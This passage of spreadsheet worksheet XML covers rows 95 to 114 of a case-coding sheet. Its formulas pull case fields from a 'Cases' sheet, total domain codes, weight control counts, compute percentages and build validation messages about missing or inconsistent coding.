      </c>
      <c r="AK95" s="13">
        <f>IF(AI95="","",COUNTIF(N95:AG95,1))</f>
        <v/>
      </c>
      <c r="AL95" s="13">
        <f>IF(OR(AJ95="",AJ95=0),"",ROUND(100*(AJ95-AK95)/AJ95,1))</f>
        <v/>
      </c>
      <c r="AM95" s="11">
        <f>IF(AI95="","",IF(AI95=0,"No domain coded 1; ","")&amp;IF(M95="","Primary domain missing; ",IF(IFERROR(INDEX(E95:L95,1,M95),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N95:AG95)&lt;&gt;AJ95,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH95="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN95" s="13">
        <f>IF(AND(AI95&lt;&gt;"",AM95=""),1,0)</f>
        <v/>
      </c>
      <c r="AO95" s="14" t="n"/>
    </row>
    <row r="96">
      <c r="A96" s="11">
        <f>Cases!A96</f>
        <v/>
      </c>
      <c r="B96" s="11">
        <f>Cases!B96</f>
        <v/>
      </c>
      <c r="C96" s="11">
        <f>Cases!C96</f>
        <v/>
      </c>
      <c r="D96" s="11">
        <f>IF(Cases!F96="",LEFT(Cases!G96,120),Cases!F96)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E96:L96)=0,"",SUM(E96:L96))</f>
        <v/>
      </c>
      <c r="AJ96" s="13">
        <f>IF(AI96="","",N(E96)*3+N(F96)*2+N(G96)*2+N(H96)*2+N(I96)*2+N(J96)*3+N(K96)*3+N(L96)*3)</f>
        <v/>
      </c>
      <c r="AK96" s="13">
        <f>IF(AI96="","",COUNTIF(N96:AG96,1))</f>
        <v/>
      </c>
      <c r="AL96" s="13">
        <f>IF(OR(AJ96="",AJ96=0),"",ROUND(100*(AJ96-AK96)/AJ96,1))</f>
        <v/>
      </c>
      <c r="AM96" s="11">
        <f>IF(AI96="","",IF(AI96=0,"No domain coded 1; ","")&amp;IF(M96="","Primary domain missing; ",IF(IFERROR(INDEX(E96:L96,1,M96),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N96:AG96)&lt;&gt;AJ96,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH96="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN96" s="13">
        <f>IF(AND(AI96&lt;&gt;"",AM96=""),1,0)</f>
        <v/>
      </c>
      <c r="AO96" s="14" t="n"/>
    </row>
    <row r="97">
      <c r="A97" s="11">
        <f>Cases!A97</f>
        <v/>
      </c>
      <c r="B97" s="11">
        <f>Cases!B97</f>
        <v/>
      </c>
      <c r="C97" s="11">
        <f>Cases!C97</f>
        <v/>
      </c>
      <c r="D97" s="11">
        <f>IF(Cases!F97="",LEFT(Cases!G97,120),Cases!F97)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E97:L97)=0,"",SUM(E97:L97))</f>
        <v/>
      </c>
      <c r="AJ97" s="13">
        <f>IF(AI97="","",N(E97)*3+N(F97)*2+N(G97)*2+N(H97)*2+N(I97)*2+N(J97)*3+N(K97)*3+N(L97)*3)</f>
        <v/>
      </c>
      <c r="AK97" s="13">
        <f>IF(AI97="","",COUNTIF(N97:AG97,1))</f>
        <v/>
      </c>
      <c r="AL97" s="13">
        <f>IF(OR(AJ97="",AJ97=0),"",ROUND(100*(AJ97-AK97)/AJ97,1))</f>
        <v/>
      </c>
      <c r="AM97" s="11">
        <f>IF(AI97="","",IF(AI97=0,"No domain coded 1; ","")&amp;IF(M97="","Primary domain missing; ",IF(IFERROR(INDEX(E97:L97,1,M97),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N97:AG97)&lt;&gt;AJ97,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH97="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN97" s="13">
        <f>IF(AND(AI97&lt;&gt;"",AM97=""),1,0)</f>
        <v/>
      </c>
      <c r="AO97" s="14" t="n"/>
    </row>
    <row r="98">
      <c r="A98" s="11">
        <f>Cases!A98</f>
        <v/>
      </c>
      <c r="B98" s="11">
        <f>Cases!B98</f>
        <v/>
      </c>
      <c r="C98" s="11">
        <f>Cases!C98</f>
        <v/>
      </c>
      <c r="D98" s="11">
        <f>IF(Cases!F98="",LEFT(Cases!G98,120),Cases!F98)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E98:L98)=0,"",SUM(E98:L98))</f>
        <v/>
      </c>
      <c r="AJ98" s="13">
        <f>IF(AI98="","",N(E98)*3+N(F98)*2+N(G98)*2+N(H98)*2+N(I98)*2+N(J98)*3+N(K98)*3+N(L98)*3)</f>
        <v/>
      </c>
      <c r="AK98" s="13">
        <f>IF(AI98="","",COUNTIF(N98:AG98,1))</f>
        <v/>
      </c>
      <c r="AL98" s="13">
        <f>IF(OR(AJ98="",AJ98=0),"",ROUND(100*(AJ98-AK98)/AJ98,1))</f>
        <v/>
      </c>
      <c r="AM98" s="11">
        <f>IF(AI98="","",IF(AI98=0,"No domain coded 1; ","")&amp;IF(M98="","Primary domain missing; ",IF(IFERROR(INDEX(E98:L98,1,M98),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N98:AG98)&lt;&gt;AJ98,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH98="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN98" s="13">
        <f>IF(AND(AI98&lt;&gt;"",AM98=""),1,0)</f>
        <v/>
      </c>
      <c r="AO98" s="14" t="n"/>
    </row>
    <row r="99">
      <c r="A99" s="11">
        <f>Cases!A99</f>
        <v/>
      </c>
      <c r="B99" s="11">
        <f>Cases!B99</f>
        <v/>
      </c>
      <c r="C99" s="11">
        <f>Cases!C99</f>
        <v/>
      </c>
      <c r="D99" s="11">
        <f>IF(Cases!F99="",LEFT(Cases!G99,120),Cases!F99)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E99:L99)=0,"",SUM(E99:L99))</f>
        <v/>
      </c>
      <c r="AJ99" s="13">
        <f>IF(AI99="","",N(E99)*3+N(F99)*2+N(G99)*2+N(H99)*2+N(I99)*2+N(J99)*3+N(K99)*3+N(L99)*3)</f>
        <v/>
      </c>
      <c r="AK99" s="13">
        <f>IF(AI99="","",COUNTIF(N99:AG99,1))</f>
        <v/>
      </c>
      <c r="AL99" s="13">
        <f>IF(OR(AJ99="",AJ99=0),"",ROUND(100*(AJ99-AK99)/AJ99,1))</f>
        <v/>
      </c>
      <c r="AM99" s="11">
        <f>IF(AI99="","",IF(AI99=0,"No domain coded 1; ","")&amp;IF(M99="","Primary domain missing; ",IF(IFERROR(INDEX(E99:L99,1,M99),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N99:AG99)&lt;&gt;AJ99,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH99="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN99" s="13">
        <f>IF(AND(AI99&lt;&gt;"",AM99=""),1,0)</f>
        <v/>
      </c>
      <c r="AO99" s="14" t="n"/>
    </row>
    <row r="100">
      <c r="A100" s="11">
        <f>Cases!A100</f>
        <v/>
      </c>
      <c r="B100" s="11">
        <f>Cases!B100</f>
        <v/>
      </c>
      <c r="C100" s="11">
        <f>Cases!C100</f>
        <v/>
      </c>
      <c r="D100" s="11">
        <f>IF(Cases!F100="",LEFT(Cases!G100,120),Cases!F100)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E100:L100)=0,"",SUM(E100:L100))</f>
        <v/>
      </c>
      <c r="AJ100" s="13">
        <f>IF(AI100="","",N(E100)*3+N(F100)*2+N(G100)*2+N(H100)*2+N(I100)*2+N(J100)*3+N(K100)*3+N(L100)*3)</f>
        <v/>
      </c>
      <c r="AK100" s="13">
        <f>IF(AI100="","",COUNTIF(N100:AG100,1))</f>
        <v/>
      </c>
      <c r="AL100" s="13">
        <f>IF(OR(AJ100="",AJ100=0),"",ROUND(100*(AJ100-AK100)/AJ100,1))</f>
        <v/>
      </c>
      <c r="AM100" s="11">
        <f>IF(AI100="","",IF(AI100=0,"No domain coded 1; ","")&amp;IF(M100="","Primary domain missing; ",IF(IFERROR(INDEX(E100:L100,1,M100),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N100:AG100)&lt;&gt;AJ100,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH100="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN100" s="13">
        <f>IF(AND(AI100&lt;&gt;"",AM100=""),1,0)</f>
        <v/>
      </c>
      <c r="AO100" s="14" t="n"/>
    </row>
    <row r="101">
      <c r="A101" s="11">
        <f>Cases!A101</f>
        <v/>
      </c>
      <c r="B101" s="11">
        <f>Cases!B101</f>
        <v/>
      </c>
      <c r="C101" s="11">
        <f>Cases!C101</f>
        <v/>
      </c>
      <c r="D101" s="11">
        <f>IF(Cases!F101="",LEFT(Cases!G101,120),Cases!F101)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E101:L101)=0,"",SUM(E101:L101))</f>
        <v/>
      </c>
      <c r="AJ101" s="13">
        <f>IF(AI101="","",N(E101)*3+N(F101)*2+N(G101)*2+N(H101)*2+N(I101)*2+N(J101)*3+N(K101)*3+N(L101)*3)</f>
        <v/>
      </c>
      <c r="AK101" s="13">
        <f>IF(AI101="","",COUNTIF(N101:AG101,1))</f>
        <v/>
      </c>
      <c r="AL101" s="13">
        <f>IF(OR(AJ101="",AJ101=0),"",ROUND(100*(AJ101-AK101)/AJ101,1))</f>
        <v/>
      </c>
      <c r="AM101" s="11">
        <f>IF(AI101="","",IF(AI101=0,"No domain coded 1; ","")&amp;IF(M101="","Primary domain missing; ",IF(IFERROR(INDEX(E101:L101,1,M101),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N101:AG101)&lt;&gt;AJ101,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH101="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN101" s="13">
        <f>IF(AND(AI101&lt;&gt;"",AM101=""),1,0)</f>
        <v/>
      </c>
      <c r="AO101" s="14" t="n"/>
    </row>
    <row r="102">
      <c r="A102" s="11">
        <f>Cases!A102</f>
        <v/>
      </c>
      <c r="B102" s="11">
        <f>Cases!B102</f>
        <v/>
      </c>
      <c r="C102" s="11">
        <f>Cases!C102</f>
        <v/>
      </c>
      <c r="D102" s="11">
        <f>IF(Cases!F102="",LEFT(Cases!G102,120),Cases!F102)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E102:L102)=0,"",SUM(E102:L102))</f>
        <v/>
      </c>
      <c r="AJ102" s="13">
        <f>IF(AI102="","",N(E102)*3+N(F102)*2+N(G102)*2+N(H102)*2+N(I102)*2+N(J102)*3+N(K102)*3+N(L102)*3)</f>
        <v/>
      </c>
      <c r="AK102" s="13">
        <f>IF(AI102="","",COUNTIF(N102:AG102,1))</f>
        <v/>
      </c>
      <c r="AL102" s="13">
        <f>IF(OR(AJ102="",AJ102=0),"",ROUND(100*(AJ102-AK102)/AJ102,1))</f>
        <v/>
      </c>
      <c r="AM102" s="11">
        <f>IF(AI102="","",IF(AI102=0,"No domain coded 1; ","")&amp;IF(M102="","Primary domain missing; ",IF(IFERROR(INDEX(E102:L102,1,M102),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N102:AG102)&lt;&gt;AJ102,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH102="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN102" s="13">
        <f>IF(AND(AI102&lt;&gt;"",AM102=""),1,0)</f>
        <v/>
      </c>
      <c r="AO102" s="14" t="n"/>
    </row>
    <row r="103">
      <c r="A103" s="11">
        <f>Cases!A103</f>
        <v/>
      </c>
      <c r="B103" s="11">
        <f>Cases!B103</f>
        <v/>
      </c>
      <c r="C103" s="11">
        <f>Cases!C103</f>
        <v/>
      </c>
      <c r="D103" s="11">
        <f>IF(Cases!F103="",LEFT(Cases!G103,120),Cases!F103)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E103:L103)=0,"",SUM(E103:L103))</f>
        <v/>
      </c>
      <c r="AJ103" s="13">
        <f>IF(AI103="","",N(E103)*3+N(F103)*2+N(G103)*2+N(H103)*2+N(I103)*2+N(J103)*3+N(K103)*3+N(L103)*3)</f>
        <v/>
      </c>
      <c r="AK103" s="13">
        <f>IF(AI103="","",COUNTIF(N103:AG103,1))</f>
        <v/>
      </c>
      <c r="AL103" s="13">
        <f>IF(OR(AJ103="",AJ103=0),"",ROUND(100*(AJ103-AK103)/AJ103,1))</f>
        <v/>
      </c>
      <c r="AM103" s="11">
        <f>IF(AI103="","",IF(AI103=0,"No domain coded 1; ","")&amp;IF(M103="","Primary domain missing; ",IF(IFERROR(INDEX(E103:L103,1,M103),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N103:AG103)&lt;&gt;AJ103,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH103="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN103" s="13">
        <f>IF(AND(AI103&lt;&gt;"",AM103=""),1,0)</f>
        <v/>
      </c>
      <c r="AO103" s="14" t="n"/>
    </row>
    <row r="104">
      <c r="A104" s="11">
        <f>Cases!A104</f>
        <v/>
      </c>
      <c r="B104" s="11">
        <f>Cases!B104</f>
        <v/>
      </c>
      <c r="C104" s="11">
        <f>Cases!C104</f>
        <v/>
      </c>
      <c r="D104" s="11">
        <f>IF(Cases!F104="",LEFT(Cases!G104,120),Cases!F104)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E104:L104)=0,"",SUM(E104:L104))</f>
        <v/>
      </c>
      <c r="AJ104" s="13">
        <f>IF(AI104="","",N(E104)*3+N(F104)*2+N(G104)*2+N(H104)*2+N(I104)*2+N(J104)*3+N(K104)*3+N(L104)*3)</f>
        <v/>
      </c>
      <c r="AK104" s="13">
        <f>IF(AI104="","",COUNTIF(N104:AG104,1))</f>
        <v/>
      </c>
      <c r="AL104" s="13">
        <f>IF(OR(AJ104="",AJ104=0),"",ROUND(100*(AJ104-AK104)/AJ104,1))</f>
        <v/>
      </c>
      <c r="AM104" s="11">
        <f>IF(AI104="","",IF(AI104=0,"No domain coded 1; ","")&amp;IF(M104="","Primary domain missing; ",IF(IFERROR(INDEX(E104:L104,1,M104),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N104:AG104)&lt;&gt;AJ104,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH104="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN104" s="13">
        <f>IF(AND(AI104&lt;&gt;"",AM104=""),1,0)</f>
        <v/>
      </c>
      <c r="AO104" s="14" t="n"/>
    </row>
    <row r="105">
      <c r="A105" s="11">
        <f>Cases!A105</f>
        <v/>
      </c>
      <c r="B105" s="11">
        <f>Cases!B105</f>
        <v/>
      </c>
      <c r="C105" s="11">
        <f>Cases!C105</f>
        <v/>
      </c>
      <c r="D105" s="11">
        <f>IF(Cases!F105="",LEFT(Cases!G105,120),Cases!F105)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E105:L105)=0,"",SUM(E105:L105))</f>
        <v/>
      </c>
      <c r="AJ105" s="13">
        <f>IF(AI105="","",N(E105)*3+N(F105)*2+N(G105)*2+N(H105)*2+N(I105)*2+N(J105)*3+N(K105)*3+N(L105)*3)</f>
        <v/>
      </c>
      <c r="AK105" s="13">
        <f>IF(AI105="","",COUNTIF(N105:AG105,1))</f>
        <v/>
      </c>
      <c r="AL105" s="13">
        <f>IF(OR(AJ105="",AJ105=0),"",ROUND(100*(AJ105-AK105)/AJ105,1))</f>
        <v/>
      </c>
      <c r="AM105" s="11">
        <f>IF(AI105="","",IF(AI105=0,"No domain coded 1; ","")&amp;IF(M105="","Primary domain missing; ",IF(IFERROR(INDEX(E105:L105,1,M105),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N105:AG105)&lt;&gt;AJ105,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH105="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN105" s="13">
        <f>IF(AND(AI105&lt;&gt;"",AM105=""),1,0)</f>
        <v/>
      </c>
      <c r="AO105" s="14" t="n"/>
    </row>
    <row r="106">
      <c r="A106" s="11">
        <f>Cases!A106</f>
        <v/>
      </c>
      <c r="B106" s="11">
        <f>Cases!B106</f>
        <v/>
      </c>
      <c r="C106" s="11">
        <f>Cases!C106</f>
        <v/>
      </c>
      <c r="D106" s="11">
        <f>IF(Cases!F106="",LEFT(Cases!G106,120),Cases!F106)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E106:L106)=0,"",SUM(E106:L106))</f>
        <v/>
      </c>
      <c r="AJ106" s="13">
        <f>IF(AI106="","",N(E106)*3+N(F106)*2+N(G106)*2+N(H106)*2+N(I106)*2+N(J106)*3+N(K106)*3+N(L106)*3)</f>
        <v/>
      </c>
      <c r="AK106" s="13">
        <f>IF(AI106="","",COUNTIF(N106:AG106,1))</f>
        <v/>
      </c>
      <c r="AL106" s="13">
        <f>IF(OR(AJ106="",AJ106=0),"",ROUND(100*(AJ106-AK106)/AJ106,1))</f>
        <v/>
      </c>
      <c r="AM106" s="11">
        <f>IF(AI106="","",IF(AI106=0,"No domain coded 1; ","")&amp;IF(M106="","Primary domain missing; ",IF(IFERROR(INDEX(E106:L106,1,M106),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N106:AG106)&lt;&gt;AJ106,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH106="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN106" s="13">
        <f>IF(AND(AI106&lt;&gt;"",AM106=""),1,0)</f>
        <v/>
      </c>
      <c r="AO106" s="14" t="n"/>
    </row>
    <row r="107">
      <c r="A107" s="11">
        <f>Cases!A107</f>
        <v/>
      </c>
      <c r="B107" s="11">
        <f>Cases!B107</f>
        <v/>
      </c>
      <c r="C107" s="11">
        <f>Cases!C107</f>
        <v/>
      </c>
      <c r="D107" s="11">
        <f>IF(Cases!F107="",LEFT(Cases!G107,120),Cases!F107)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E107:L107)=0,"",SUM(E107:L107))</f>
        <v/>
      </c>
      <c r="AJ107" s="13">
        <f>IF(AI107="","",N(E107)*3+N(F107)*2+N(G107)*2+N(H107)*2+N(I107)*2+N(J107)*3+N(K107)*3+N(L107)*3)</f>
        <v/>
      </c>
      <c r="AK107" s="13">
        <f>IF(AI107="","",COUNTIF(N107:AG107,1))</f>
        <v/>
      </c>
      <c r="AL107" s="13">
        <f>IF(OR(AJ107="",AJ107=0),"",ROUND(100*(AJ107-AK107)/AJ107,1))</f>
        <v/>
      </c>
      <c r="AM107" s="11">
        <f>IF(AI107="","",IF(AI107=0,"No domain coded 1; ","")&amp;IF(M107="","Primary domain missing; ",IF(IFERROR(INDEX(E107:L107,1,M107),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N107:AG107)&lt;&gt;AJ107,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH107="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN107" s="13">
        <f>IF(AND(AI107&lt;&gt;"",AM107=""),1,0)</f>
        <v/>
      </c>
      <c r="AO107" s="14" t="n"/>
    </row>
    <row r="108">
      <c r="A108" s="11">
        <f>Cases!A108</f>
        <v/>
      </c>
      <c r="B108" s="11">
        <f>Cases!B108</f>
        <v/>
      </c>
      <c r="C108" s="11">
        <f>Cases!C108</f>
        <v/>
      </c>
      <c r="D108" s="11">
        <f>IF(Cases!F108="",LEFT(Cases!G108,120),Cases!F108)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E108:L108)=0,"",SUM(E108:L108))</f>
        <v/>
      </c>
      <c r="AJ108" s="13">
        <f>IF(AI108="","",N(E108)*3+N(F108)*2+N(G108)*2+N(H108)*2+N(I108)*2+N(J108)*3+N(K108)*3+N(L108)*3)</f>
        <v/>
      </c>
      <c r="AK108" s="13">
        <f>IF(AI108="","",COUNTIF(N108:AG108,1))</f>
        <v/>
      </c>
      <c r="AL108" s="13">
        <f>IF(OR(AJ108="",AJ108=0),"",ROUND(100*(AJ108-AK108)/AJ108,1))</f>
        <v/>
      </c>
      <c r="AM108" s="11">
        <f>IF(AI108="","",IF(AI108=0,"No domain coded 1; ","")&amp;IF(M108="","Primary domain missing; ",IF(IFERROR(INDEX(E108:L108,1,M108),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N108:AG108)&lt;&gt;AJ108,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH108="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN108" s="13">
        <f>IF(AND(AI108&lt;&gt;"",AM108=""),1,0)</f>
        <v/>
      </c>
      <c r="AO108" s="14" t="n"/>
    </row>
    <row r="109">
      <c r="A109" s="11">
        <f>Cases!A109</f>
        <v/>
      </c>
      <c r="B109" s="11">
        <f>Cases!B109</f>
        <v/>
      </c>
      <c r="C109" s="11">
        <f>Cases!C109</f>
        <v/>
      </c>
      <c r="D109" s="11">
        <f>IF(Cases!F109="",LEFT(Cases!G109,120),Cases!F109)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E109:L109)=0,"",SUM(E109:L109))</f>
        <v/>
      </c>
      <c r="AJ109" s="13">
        <f>IF(AI109="","",N(E109)*3+N(F109)*2+N(G109)*2+N(H109)*2+N(I109)*2+N(J109)*3+N(K109)*3+N(L109)*3)</f>
        <v/>
      </c>
      <c r="AK109" s="13">
        <f>IF(AI109="","",COUNTIF(N109:AG109,1))</f>
        <v/>
      </c>
      <c r="AL109" s="13">
        <f>IF(OR(AJ109="",AJ109=0),"",ROUND(100*(AJ109-AK109)/AJ109,1))</f>
        <v/>
      </c>
      <c r="AM109" s="11">
        <f>IF(AI109="","",IF(AI109=0,"No domain coded 1; ","")&amp;IF(M109="","Primary domain missing; ",IF(IFERROR(INDEX(E109:L109,1,M109),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N109:AG109)&lt;&gt;AJ109,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH109="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN109" s="13">
        <f>IF(AND(AI109&lt;&gt;"",AM109=""),1,0)</f>
        <v/>
      </c>
      <c r="AO109" s="14" t="n"/>
    </row>
    <row r="110">
      <c r="A110" s="11">
        <f>Cases!A110</f>
        <v/>
      </c>
      <c r="B110" s="11">
        <f>Cases!B110</f>
        <v/>
      </c>
      <c r="C110" s="11">
        <f>Cases!C110</f>
        <v/>
      </c>
      <c r="D110" s="11">
        <f>IF(Cases!F110="",LEFT(Cases!G110,120),Cases!F110)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E110:L110)=0,"",SUM(E110:L110))</f>
        <v/>
      </c>
      <c r="AJ110" s="13">
        <f>IF(AI110="","",N(E110)*3+N(F110)*2+N(G110)*2+N(H110)*2+N(I110)*2+N(J110)*3+N(K110)*3+N(L110)*3)</f>
        <v/>
      </c>
      <c r="AK110" s="13">
        <f>IF(AI110="","",COUNTIF(N110:AG110,1))</f>
        <v/>
      </c>
      <c r="AL110" s="13">
        <f>IF(OR(AJ110="",AJ110=0),"",ROUND(100*(AJ110-AK110)/AJ110,1))</f>
        <v/>
      </c>
      <c r="AM110" s="11">
        <f>IF(AI110="","",IF(AI110=0,"No domain coded 1; ","")&amp;IF(M110="","Primary domain missing; ",IF(IFERROR(INDEX(E110:L110,1,M110),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N110:AG110)&lt;&gt;AJ110,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH110="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN110" s="13">
        <f>IF(AND(AI110&lt;&gt;"",AM110=""),1,0)</f>
        <v/>
      </c>
      <c r="AO110" s="14" t="n"/>
    </row>
    <row r="111">
      <c r="A111" s="11">
        <f>Cases!A111</f>
        <v/>
      </c>
      <c r="B111" s="11">
        <f>Cases!B111</f>
        <v/>
      </c>
      <c r="C111" s="11">
        <f>Cases!C111</f>
        <v/>
      </c>
      <c r="D111" s="11">
        <f>IF(Cases!F111="",LEFT(Cases!G111,120),Cases!F111)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E111:L111)=0,"",SUM(E111:L111))</f>
        <v/>
      </c>
      <c r="AJ111" s="13">
        <f>IF(AI111="","",N(E111)*3+N(F111)*2+N(G111)*2+N(H111)*2+N(I111)*2+N(J111)*3+N(K111)*3+N(L111)*3)</f>
        <v/>
      </c>
      <c r="AK111" s="13">
        <f>IF(AI111="","",COUNTIF(N111:AG111,1))</f>
        <v/>
      </c>
      <c r="AL111" s="13">
        <f>IF(OR(AJ111="",AJ111=0),"",ROUND(100*(AJ111-AK111)/AJ111,1))</f>
        <v/>
      </c>
      <c r="AM111" s="11">
        <f>IF(AI111="","",IF(AI111=0,"No domain coded 1; ","")&amp;IF(M111="","Primary domain missing; ",IF(IFERROR(INDEX(E111:L111,1,M111),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N111:AG111)&lt;&gt;AJ111,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH111="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN111" s="13">
        <f>IF(AND(AI111&lt;&gt;"",AM111=""),1,0)</f>
        <v/>
      </c>
      <c r="AO111" s="14" t="n"/>
    </row>
    <row r="112">
      <c r="A112" s="11">
        <f>Cases!A112</f>
        <v/>
      </c>
      <c r="B112" s="11">
        <f>Cases!B112</f>
        <v/>
      </c>
      <c r="C112" s="11">
        <f>Cases!C112</f>
        <v/>
      </c>
      <c r="D112" s="11">
        <f>IF(Cases!F112="",LEFT(Cases!G112,120),Cases!F112)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E112:L112)=0,"",SUM(E112:L112))</f>
        <v/>
      </c>
      <c r="AJ112" s="13">
        <f>IF(AI112="","",N(E112)*3+N(F112)*2+N(G112)*2+N(H112)*2+N(I112)*2+N(J112)*3+N(K112)*3+N(L112)*3)</f>
        <v/>
      </c>
      <c r="AK112" s="13">
        <f>IF(AI112="","",COUNTIF(N112:AG112,1))</f>
        <v/>
      </c>
      <c r="AL112" s="13">
        <f>IF(OR(AJ112="",AJ112=0),"",ROUND(100*(AJ112-AK112)/AJ112,1))</f>
        <v/>
      </c>
      <c r="AM112" s="11">
        <f>IF(AI112="","",IF(AI112=0,"No domain coded 1; ","")&amp;IF(M112="","Primary domain missing; ",IF(IFERROR(INDEX(E112:L112,1,M112),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N112:AG112)&lt;&gt;AJ112,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH112="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN112" s="13">
        <f>IF(AND(AI112&lt;&gt;"",AM112=""),1,0)</f>
        <v/>
      </c>
      <c r="AO112" s="14" t="n"/>
    </row>
    <row r="113">
      <c r="A113" s="11">
        <f>Cases!A113</f>
        <v/>
      </c>
      <c r="B113" s="11">
        <f>Cases!B113</f>
        <v/>
      </c>
      <c r="C113" s="11">
        <f>Cases!C113</f>
        <v/>
      </c>
      <c r="D113" s="11">
        <f>IF(Cases!F113="",LEFT(Cases!G113,120),Cases!F113)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E113:L113)=0,"",SUM(E113:L113))</f>
        <v/>
      </c>
      <c r="AJ113" s="13">
        <f>IF(AI113="","",N(E113)*3+N(F113)*2+N(G113)*2+N(H113)*2+N(I113)*2+N(J113)*3+N(K113)*3+N(L113)*3)</f>
        <v/>
      </c>
      <c r="AK113" s="13">
        <f>IF(AI113="","",COUNTIF(N113:AG113,1))</f>
        <v/>
      </c>
      <c r="AL113" s="13">
        <f>IF(OR(AJ113="",AJ113=0),"",ROUND(100*(AJ113-AK113)/AJ113,1))</f>
        <v/>
      </c>
      <c r="AM113" s="11">
        <f>IF(AI113="","",IF(AI113=0,"No domain coded 1; ","")&amp;IF(M113="","Primary domain missing; ",IF(IFERROR(INDEX(E113:L113,1,M113),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N113:AG113)&lt;&gt;AJ113,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH113="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN113" s="13">
        <f>IF(AND(AI113&lt;&gt;"",AM113=""),1,0)</f>
        <v/>
      </c>
      <c r="AO113" s="14" t="n"/>
    </row>
    <row r="114">
      <c r="A114" s="11">
        <f>Cases!A114</f>
        <v/>
      </c>
      <c r="B114" s="11">
        <f>Cases!B114</f>
        <v/>
      </c>
      <c r="C114" s="11">
        <f>Cases!C114</f>
        <v/>
      </c>
      <c r="D114" s="11">
        <f>IF(Cases!F114="",LEFT(Cases!G114,120),Cases!F114)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E114:L114)=0,"",SUM(E114:L114))</f>
        <v/>
